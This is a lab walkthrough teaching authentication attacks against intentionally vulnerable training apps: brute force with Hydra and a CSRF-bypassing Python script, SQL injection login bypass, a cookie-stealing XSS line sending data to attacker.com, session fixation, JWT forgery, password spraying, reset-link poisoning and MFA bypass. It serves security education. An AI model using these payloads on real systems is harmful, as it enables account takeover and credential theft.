# Authentication Attacks Walkthrough

Step-by-step exercises for mastering authentication attacks across multiple vulnerable platforms.

---

## Lab 1: DVWA - Brute Force

### Environment Setup

1. Start the CyberLab environment:
```bash
cd /path/to/cyberlab
docker-compose up -d dvwa
```

2. Access DVWA at `http://localhost:8081`

3. Login with default credentials: `admin` / `password`

4. Navigate to **DVWA Security** and set security level to **Low**

### Exercise 1: Manual Brute Force

**Target:** DVWA Brute Force page

1. Navigate to **Brute Force** in the left menu

2. Try random credentials first:
```
Username: test
Password: test
```

3. Observe the error message: "Username and/or password incorrect."

4. Try the admin username with common passwords:
   - admin / admin
   - admin / 123456
   - admin / password  <- This works!

### Exercise 2: Using Burp Suite Intruder

1. Configure browser to use Burp proxy

2. Submit a login attempt and capture the request in Burp

3. Send to Intruder (Ctrl+I)

4. Configure attack:
   - Attack type: Sniper (for password only) or Cluster Bomb (both)
   - Clear existing positions
   - Add position markers around password value

5. Load payload:
   - Payload type: Simple list
   - Load a password wordlist (e.g., rockyou-top1000.txt)

6. Start attack and analyze results:
   - Look for different response length
   - Successful login has different content

### Exercise 3: Using Hydra

```bash
# Basic brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: PHPSESSID=your_session_id; security=low"

# With verbose output
hydra -V -l admin -P passwords.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=xxx; security=low"
```

**Flag: `FLAG{brut3_f0rc3_succ3ss}`**

---

## Lab 2: DVWA - Medium and High Security

### Medium Security

1. Set DVWA security to **Medium**

2. Try brute force - notice it's slower (sleep function added)

3. Adjust Hydra for delays:
```bash
hydra -l admin -P passwords.txt -t 4 -w 5 localhost http-get-form "..."
```

4. Use Burp Intruder with throttling:
   - Resource Pool: 1 concurrent request
   - Fixed delay between requests

### High Security

1. Set DVWA security to **High**

2. Notice CSRF token in the form

3. Each request needs a fresh token

4. Use Burp Suite macro:
   - Session Handling Rules
   - Create macro to fetch new token
   - Add to Intruder

5. Alternative: Use custom script
```python
import requests
from bs4 import BeautifulSoup

session = requests.Session()
base_url = "http://localhost:8081"

def get_csrf_token():
    response = session.get(f"{base_url}/vulnerabilities/brute/")
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find('input', {'name': 'user_token'})['value']

passwords = ['admin', '123456', 'password', 'letmein']

for password in passwords:
    token = get_csrf_token()
    data = {
        'username': 'admin',
        'password': password,
        'Login': 'Login',
        'user_token': token
    }
    response = session.get(f"{base_url}/vulnerabilities/brute/", params=data)
    if "Welcome to the password protected area" in response.text:
        print(f"[+] Found password: {password}")
        break
```

---

## Lab 3: Juice Shop - Credential Stuffing

### Setup

```bash
# Access Juice Shop
http://localhost:3000
```

### Challenge: Admin Login

1. Navigate to login page (/#/login)

2. Try default admin credentials:
```
admin@juice-sh.op / admin123
```

3. Try SQL injection for bypass:
```
admin@juice-sh.op'--
```

4. This bypasses the password check entirely

### Challenge: Password Strength

1. Try registering with weak password

2. Notice password policy

3. Test credential stuffing with known breached passwords:
```
admin@juice-sh.op / admin123
admin@juice-sh.op / password
admin@juice-sh.op / 123456
```

### Challenge: User Enumeration

1. Try invalid username:
```
nonexistent@test.com / anything
```

2. Try valid username with wrong password:
```
admin@juice-sh.op / wrongpassword
```

3. Compare error messages for enumeration

---

## Lab 4: bWAPP - Session Attacks

### Setup

```bash
# Access bWAPP
http://localhost:8082/bWAPP
# Login: bee / bug
```

### Session Management - Cookies (Secure)

**Location:** A3 - Session Management - Cookies (Secure)

1. Analyze the cookies in browser DevTools

2. Notice missing security attributes:
   - No HttpOnly flag
   - No Secure flag

3. XSS can steal the cookie:
```javascript
document.location='http://attacker.com/steal?c='+document.cookie
```

### Session Management - Session ID in URL

**Location:** A3 - Session Management - Session ID in URL

1. Notice session ID is in the URL

2. Copy the URL and open in a different browser

3. You're logged in without entering credentials!

4. This is vulnerable to:
   - Session hijacking via referrer
   - Sharing links exposes session

### Session ID Analysis

**Location:** A3 - Session Management - Session ID Analysis

1. Analyze session ID patterns

2. Log out and log back in multiple times

3. Compare session IDs:
```
Session 1: abc123def456
Session 2: abc123def457
Session 3: abc123def458
```

4. If sequential, you can predict valid sessions

---

## Lab 5: bWAPP - Session Fixation

### Understanding Session Fixation

**Location:** A3 - Session Management - Session Fixation

1. As attacker, get a session ID:
```
http://localhost:8082/bWAPP/sm_fixation.php?PHPSESSID=attackersession
```

2. Send this URL to victim (social engineering)

3. When victim logs in, they use your session ID

4. You now have access to their authenticated session

### Exploitation Steps

1. Visit the vulnerable page as attacker
2. Note your session ID from cookies
3. Create malicious link:
```
http://localhost:8082/bWAPP/sm_fixation.php?PHPSESSID=abc123
```

4. When victim clicks and logs in, they authenticate your session

5. Use the same session ID to access their account

---

## Lab 6: WebGoat - Authentication Flaws

### Setup

```bash
# Access WebGoat
http://localhost:8080/WebGoat
```

### Authentication Bypass

1. Navigate to A7:2023 - Authentication section

2. Identify authentication flaw type

3. Attempt bypass using:
   - SQL injection in login
   - Default credentials
   - Parameter manipulation

### Password Reset Flaw

1. Find password reset functionality

2. Request password reset for your account

3. Analyze the reset link:
```
http://localhost:8080/reset?token=abc123&user=admin
```

4. Try manipulating parameters:
   - Change user parameter
   - Predict/brute force token
   - Check for token reuse

---

## Lab 7: JWT Attacks

### Understanding JWT Structure

```
Header.Payload.Signature

# Example
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature

# Decoded Header
{"alg":"HS256","typ":"JWT"}

# Decoded Payload
{"user":"admin"}
```

### None Algorithm Attack

1. Capture a JWT token from Juice Shop

2. Decode and modify:
```bash
# Original header
{"alg":"HS256","typ":"JWT"}

# Modified header
{"alg":"none","typ":"JWT"}
```

3. Modify payload (e.g., change user to admin)

4. Remove signature (leave empty after second dot)

5. Base64 encode and send

### Weak Secret Attack

1. Capture JWT token

2. Use hashcat to crack:
```bash
# Save token to file
echo "eyJhbG..." > jwt.txt

# Crack with wordlist
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

3. Once secret is known, forge new tokens:
```python
import jwt
token = jwt.encode({'user': 'admin'}, 'secret', algorithm='HS256')
print(token)
```

### Key Confusion Attack

1. If server uses RS256 (RSA)
2. Change algorithm to HS256
3. Sign with the public key as secret
4. Server may verify using public key as HMAC secret

---

## Lab 8: Password Spraying

### Concept

Instead of trying many passwords for one user (triggers lockout), try few passwords across many users.

### Username Enumeration First

1. Collect valid usernames:
   - User registration
   - Forgot password
   - Error message differences
   - OSINT

### Spray Attack

```bash
# Using Burp Intruder
# Payload set 1: Usernames
# Payload set 2: Common passwords (5-10 only)
# Attack type: Pitchfork

# Using Hydra
hydra -L users.txt -p Spring2024! target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

### Common Spray Passwords

```
Password1
Welcome1
Spring2024
Summer2024
CompanyName123
qwerty123
```

---

## Lab 9: Password Reset Vulnerabilities

### Host Header Injection

1. Request password reset

2. Intercept and modify Host header:
```
Host: attacker.com
```

3. Reset link may be generated with attacker domain

4. Victim clicks link, you receive the token

### Token Analysis

1. Request multiple reset tokens

2. Compare for patterns:
```
Token 1: abc123def456
Token 2: abc123def457
```

3. If predictable, generate valid tokens

### Rate Limiting Bypass

```
# Add extra parameters
email=victim@test.com&email=attacker@test.com

# Use arrays
email[]=victim@test.com

# Case manipulation
Email=VICTIM@TEST.COM
```

---

## Lab 10: MFA Bypass Techniques

### Response Manipulation

1. Submit wrong MFA code

2. Intercept response in Burp

3. Change response:
```
{"success": false} -> {"success": true}
```

### Code Brute Force

1. If no rate limiting on MFA page

2. Brute force 6-digit code (000000-999999)

3. Use Intruder with number generator

### Backup Code Exploitation

1. Some apps generate backup codes

2. These may be simpler (8 characters)

3. Brute force backup codes instead

### Session Token Manipulation

1. After entering username/password, get partial session

2. Check if MFA can be skipped by manipulating flow

3. Try accessing authenticated pages directly

---

## Verification Checklist

- [ ] Successfully brute forced DVWA login
- [ ] Used Burp Suite Intruder for password attacks
- [ ] Used Hydra for command-line brute forcing
- [ ] Bypassed CSRF protection in brute force
- [ ] Demonstrated session hijacking via XSS
- [ ] Exploited session fixation vulnerability
- [ ] Cracked/forged JWT tokens
- [ ] Performed password spraying attack
- [ ] Exploited password reset vulnerability

---

## Next Steps

After completing these labs:

1. Practice on HackTheBox and TryHackMe
2. Study OAuth and SAML vulnerabilities
3. Learn about passwordless authentication attacks
4. Explore biometric bypass techniques
5. Practice MFA bypass on real-world-like scenarios
